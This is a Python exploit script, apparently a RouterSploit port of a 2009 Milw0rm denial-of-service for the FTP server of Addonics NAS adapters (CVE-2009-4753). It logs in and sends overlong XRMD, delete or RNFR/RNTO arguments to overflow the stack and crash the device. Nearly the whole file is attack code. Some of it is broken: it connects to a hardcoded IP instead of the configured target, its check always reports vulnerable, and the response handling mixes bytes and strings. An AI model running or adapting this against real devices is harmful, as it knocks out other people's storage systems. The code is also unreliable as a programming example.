#!/usr/bin/python
######################################################
# Addonics NAS Adapter FTP server DoS
# Tested against NASU2FW41 Loader 1.17
# Coded by Mike Cyr, aka h00die
# mcyr2     at           csc         dot_____________com
# Notes: Since the HTTP server was so vulnerable, is
#        this really a suprise?
# Greetz to muts and loganWHD, I tried harder
# http://www.offensive-security.com/offsec101.php turning script kiddies into ninjas daily
# Log: Vendor notification March 25, 2009
#      Vendor response March 26, 2009
#	   Milw0rm release May 1, 2009
######################################################

import socket
import sys
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):

    target = OptIP("", "Target IPv4 or IPv6 address")
    un = OptString(""," username")
    pwd = OptString("","password")



    __info__ = {

        "name": "CVE-2009-4753",
        "description": "### "
                       "### ",
        "authors": (
            "h00die",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/8584",
        ),
        "devices": (
            "Addonics","CVE-2009-4753"
        ),

    }
    
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            
            buffer= 'a'
            counter=1

            #ip = raw_input("IP: ")
            #un = raw_input("Username: ")
            #password = raw_input("Password: ")

            print_status("Vulnerable commands")
            print_status( "1. rmdir")
            print_status( "2. delete")
            print_status( "3. rename")
            
            command = ''
            a = 0

            while a == 0:
                command1 = input("Command to crash (#): ")
                command = command1
                if command1 == "1":
                    print_status("fuzzing " + self.target + " with command rmdir")
                    a = 1
                elif command1 == "2":
                    print_status( "fuzzing " + self.target + " with command delete")
                    a = 1
                elif command1 == "3":
                    print_status( "fuzzing " + self.target + " with command rename")
                    a = 1
                else:
                    print_error("your an idiot")
                    

            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                connect=s.connect(('192.168.2.101',21))
            except:
                print_error("connect failed") 
            print_status(s.recv(1024))
            s.send(b'USER ' + self.un.encode() + b'\r\n')
            print_status( s.recv(1024))
            s.send(b'PASS ' + self.pwd.encode() + b'\r\n')
            print_status( s.recv(1024))
            if command == "1":
                while len(buffer) <=512:
                    buffer = buffer + 'a'
                    counter=counter+1
                s.send(b'XRMD ' + buffer.encode() + b'\r\n')
                print_status( 'rmdir ' + buffer + '\r\n')
            elif command == "2":
                while len(buffer) <=523:
                    buffer = buffer + 'a'
                    counter=counter+1
                s.send(b'delete ' + buffer.encode() + b'\r\n')
            elif command == "3":
                while len(buffer) <=526:
                    buffer = buffer + 'a'
                    counter=counter+1
                s.send(b'RNFR ' + buffer.encode() + b'\r\n')
                answer=s.recv(1024)
                s.send(b'RNTO ' + buffer.encode() + b'\r\n')
                answer=s.recv(1024)
            if (answer == "550 Requested action not taken.\r\n"):
                print_status("Stack smashed")
            else:
                print_error( "Exploit fail: " + answer.decode())
            s.close()
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        
        return True
# milw0rm.com [2009-05-01]
